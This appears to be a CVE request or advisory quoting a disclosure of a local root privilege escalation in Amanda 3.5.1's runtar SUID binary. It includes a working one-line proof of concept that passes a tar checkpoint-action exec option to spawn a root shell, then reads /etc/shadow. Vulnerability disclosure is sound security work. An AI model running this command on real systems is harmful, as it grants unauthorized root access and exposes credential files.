> [Suggested description]
> A privilege escalation flaw was found on Amanda 3.5.1 that can take
> backup user to root privileges. The vulnerable component is the runtar
> SUID that is just a wrapper to run /usr/bin/tar with specific arguments
> that are controllable by the attacker. The program does not check
> correctly the args passed to tar binary (it assumes that all args
> should be like this --ARG VALUE but we can provide this --ARG=VALUE as
> one argument).
>
> ------------------------------------------
>
> [Additional Information]
> This flaw can be used for Code Execution, Denial of Service, Escalation of Privileges and Information Disclosure.
> This is the PoC to exploit it and get a root shell:
> backup@maher:/lib/amanda$ id
> uid=34(backup) gid=34(backup) groups=34(backup),6(disk),26(tape)
>
> backup@maher:/lib/amanda$ head /etc/shadow
> head: cannot open '/etc/shadow' for reading: Permission denied
>
> backup@maher:/lib/amanda$ ./runtar NOCONFIG tar  --create --file=/dev/null --checkpoint=1 --directory=. --checkpoint-action=exec=/bin/sh /dev/null
> tar: Removing leading `/' from member names
> # head /etc/shadow
> root:!:19132:0:99999:7:::
> daemon:*:19101:0:99999:7:::
> bin:*:19101:0:99999:7:::
> sys:*:19101:0:99999:7:::
> sync:*:19101:0:99999:7:::
> games:*:19101:0:99999:7:::
> man:*:19101:0:99999:7:::
> lp:*:19101:0:99999:7:::
> mail:*:19101:0:99999:7:::
> news:*:19101:0:99999:7:::
> #
>
> ------------------------------------------
>
> [VulnerabilityType Other]
> Flawed Arguments Checking.
>
> ------------------------------------------
>
> [Vendor of Product]
> Amanda
>
> ------------------------------------------
>
> [Affected Product Code Base]
> runtar - 3.5.1
>
> ------------------------------------------
>
> [Affected Component]
> The affected SUID binary is : runtar
> The affected file is : runtar.c
> The affected lines of code start at line 162.
>
> ------------------------------------------
>
> [Attack Type]
> Local
>
> ------------------------------------------
>
> [Impact Code execution]
> true
>
> ------------------------------------------
>
> [Impact Denial of Service]
> true
>
> ------------------------------------------
>
> [Impact Escalation of Privileges]
> true
>
> ------------------------------------------
>
> [Impact Information Disclosure]
> true
>
> ------------------------------------------
>
> [Attack Vectors]
> To exploit the binary you just have to give crafted arguments to the runtar SUID binary to escalate to root.
>
> ------------------------------------------
>
> [Reference]
> http://www.amanda.org/
>
> ------------------------------------------
>
> [Discoverer]
> Maher Azzouzi

Use CVE-2022-37705.
